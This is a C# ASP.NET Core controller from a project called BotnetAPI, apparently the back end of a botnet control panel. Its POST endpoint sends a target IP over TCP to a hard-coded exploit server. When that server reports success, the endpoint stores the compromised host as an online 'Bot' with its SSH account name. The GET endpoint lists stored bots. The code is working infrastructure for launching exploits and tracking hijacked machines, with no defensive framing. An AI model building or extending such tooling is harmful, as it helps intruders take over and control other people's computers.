using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using BotnetAPI.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using Newtonsoft.Json;

namespace BotnetAPI.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class ExploitsController : ControllerBase
    {
        private readonly BotnetContext _context;

        public ExploitsController(BotnetContext context)
        {
            _context = context;
        }

        // GET: api/exploits/5
        [HttpGet("{id}")]
        public ActionResult<Bot> GetExploit(int id)
        {
            var bot = _context.Bots.Where(x => x.Id == id).FirstOrDefault();

            if (bot == null)
                return NotFound();

            return bot;
        }

        // POST: api/Exploits
        [HttpPost]
        public async Task<IActionResult> PostExploit(Exploit exploit)
        {
            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint ipe = new IPEndPoint(IPAddress.Parse("192.168.175.128"), 5545);

            clientSocket.Connect(ipe);

            byte[] IP = Encoding.UTF8.GetBytes(exploit.IP);
            clientSocket.Send(IP);
            byte[] response = new byte[1024];
            clientSocket.Receive(response, SocketFlags.None);
            string responseStr = Encoding.UTF8.GetString(response);
            clientSocket.Close();

            responseStr = responseStr[0..(responseStr.IndexOf("\0"))];

            ExploitResult result = JsonConvert.DeserializeObject<ExploitResult>(responseStr);

            if (result.Status == "Failed")
            {
                return StatusCode(StatusCodes.Status500InternalServerError, new Response { Status = "Exploit failed", Message = result.ErrorMessage });
            }

            Bot bot = new Bot()
            {
                UserId = "1",
                IP = exploit.IP,
                Platform = "Linux",
                Status = "Online",
                SSHName = result.SSHName
            };

            _context.Add(bot);
            await _context.SaveChangesAsync();

            return CreatedAtAction(nameof(GetExploit), new { id = bot.Id }, bot);
        }
    }
}
